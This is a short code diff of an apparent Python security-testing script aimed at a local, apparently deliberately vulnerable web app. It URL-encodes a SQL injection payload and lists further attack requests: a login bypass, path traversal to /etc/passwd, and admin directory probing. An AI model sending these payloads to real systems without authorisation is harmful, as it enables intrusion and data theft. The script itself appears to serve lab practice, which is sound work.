@@ -1,11 +1,14 @@
 import urllib.request
+import urllib.parse
 import urllib.error
 import time
 
 BASE_URL = "http://localhost:3000"
 
+sqli_payload = urllib.parse.quote("'OR'1'='1")
+
 PAYLOADS = [
-    ("/rest/products/search?q='OR'1'='1", "SQL Injection - Product Search"),
+    (f"/rest/products/search?q={sqli_payload}", "SQL Injection - Product Search"),
     ("/rest/user/login", "SQL Injection - Login Bypass"),
     ("/public/images/../../../../etc/passwd", "Path Traversal"),
     ("/admin", "Directory Enumeration - Admin"),
